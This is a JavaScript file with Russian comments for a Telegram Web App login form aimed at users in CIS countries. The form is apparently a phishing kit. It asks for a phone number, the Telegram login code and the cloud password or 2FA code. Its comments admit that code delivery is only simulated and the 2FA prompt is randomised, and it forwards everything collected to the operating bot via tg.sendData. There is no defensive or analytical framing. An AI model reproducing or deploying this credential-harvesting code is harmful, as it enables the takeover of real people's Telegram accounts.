// Инициализация Telegram Web App
let tg = window.Telegram.WebApp;
tg.expand();
tg.BackButton.hide();

let currentStep = 1;
let userData = {
    country: '7',
    phone: '',
    code: '',
    password: '',
    twofa: ''
};

// Страны СНГ с масками
const countries = {
    '7': { code: '+7', mask: '9999999999', placeholder: '(999) 123-45-67' },
    '380': { code: '+380', mask: '999999999', placeholder: '(99) 123-45-67' },
    '375': { code: '+375', mask: '999999999', placeholder: '(29) 123-45-67' },
    '998': { code: '+998', mask: '999999999', placeholder: '(99) 123-45-67' },
    '992': { code: '+992', mask: '999999999', placeholder: '(99) 123-45-67' },
    '993': { code: '+993', mask: '999999999', placeholder: '(99) 123-45-67' },
    '996': { code: '+996', mask: '999999999', placeholder: '(999) 123-456' },
    '373': { code: '+373', mask: '99999999', placeholder: '(99) 123-456' },
    '374': { code: '+374', mask: '99999999', placeholder: '(99) 123-456' },
    '995': { code: '+995', mask: '999999999', placeholder: '(999) 123-456' },
    '994': { code: '+994', mask: '999999999', placeholder: '(99) 123-45-67' }
};

// Обновление кода страны
function updateCountryCode() {
    const select = document.getElementById('country');
    const selected = select.options[select.selectedIndex];
    const countryCode = selected.value;
    
    // Обновляем отображаемый код
    document.getElementById('countryCode').textContent = selected.getAttribute('data-code');
    
    // Обновляем плейсхолдер
    const phoneInput = document.getElementById('phone');
    phoneInput.placeholder = selected.getAttribute('data-placeholder');
    
    // Сохраняем данные
    userData.country = countryCode;
    
    // Очищаем поле телефона
    phoneInput.value = '';
    phoneInput.focus();
}

// Форматирование телефона
function formatPhoneNumber(phone, country) {
    const countryData = countries[country];
    if (!countryData) return phone;
    
    let cleaned = phone.replace(/\D/g, '');
    const mask = countryData.mask;
    let result = '';
    let maskIndex = 0;
    
    for (let i = 0; i < Math.min(cleaned.length, mask.length); i++) {
        if (mask[maskIndex] === '9') {
            result += cleaned[i];
            maskIndex++;
        } else {
            result += mask[maskIndex];
            maskIndex++;
            i--; // Не увеличиваем индекс числа
        }
    }
    
    return result;
}

// Показать шаг
function showStep(step) {
    document.querySelectorAll('.form-step, .loading, .success, .error')
        .forEach(el => el.style.display = 'none');
    
    currentStep = step;
    
    if (step === 'loading') {
        document.getElementById('loading').style.display = 'block';
    } else if (step === 'success') {
        document.getElementById('success').style.display = 'block';
    } else if (step === 'error') {
        document.getElementById('error').style.display = 'block';
    } else {
        document.getElementById(`step${step}`).style.display = 'block';
    }
}

// Запрос кода
function requestCode() {
    const phoneInput = document.getElementById('phone');
    const phone = phoneInput.value.replace(/\D/g, '');
    const country = userData.country;
    
    // Валидация
    if (!phone || phone.length < 5) {
        alert('Введите корректный номер телефона');
        return;
    }
    
    const countryData = countries[country];
    if (!countryData) {
        alert('Выберите страну');
        return;
    }
    
    // Сохраняем данные
    userData.phone = countryData.code + phone;
    userData.country = country;
    
    // Форматируем номер для отображения
    phoneInput.value = formatPhoneNumber(phone, country);
    
    // Переходим к следующему шагу
    showStep(2);
    
    // Имитируем отправку кода
    setTimeout(() => {
        alert(`Код отправлен на номер ${userData.phone}`);
    }, 300);
}

// Проверка кода
function checkAuth() {
    const code = document.getElementById('code').value.trim();
    
    if (!code || code.length !== 5 || !/^\d+$/.test(code)) {
        alert('Введите 5-значный цифровой код');
        return;
    }
    
    userData.code = code;
    
    // Показываем загрузку
    showStep('loading');
    
    // Имитация проверки (в 20% случаев запрашиваем 2FA)
    setTimeout(() => {
        if (Math.random() < 0.2) {
            showStep(3);
        } else {
            submitData();
        }
    }, 1500);
}

// Отправка 2FA данных
function submit2FA() {
    const password = document.getElementById('password').value;
    const twofa = document.getElementById('twofa').value;
    
    if (password) userData.password = password;
    if (twofa) userData.twofa = twofa;
    
    submitData();
}

// Отправка всех данных
function submitData() {
    showStep('loading');
    
    setTimeout(() => {
        // Отправляем данные в бота
        tg.sendData(JSON.stringify(userData));
        
        // Показываем успех
        setTimeout(() => {
            showStep('success');
        }, 2000);
        
    }, 1500);
}

// Повторная отправка кода
function resendCode() {
    alert('Код отправлен повторно');
    return false;
}

// Инициализация при загрузке
document.addEventListener('DOMContentLoaded', function() {
    // Настройка маски для телефона
    const phoneInput = document.getElementById('phone');
    
    phoneInput.addEventListener('input', function(e) {
        const country = userData.country;
        const formatted = formatPhoneNumber(e.target.value, country);
        
        // Сохраняем позицию курсора
        const cursorPos = e.target.selectionStart;
        
        // Обновляем значение
        e.target.value = formatted;
        
        // Восстанавливаем позицию курсора
        e.target.setSelectionRange(cursorPos, cursorPos);
    });
    
    // Автофокус на поле телефона
    phoneInput.focus();
});
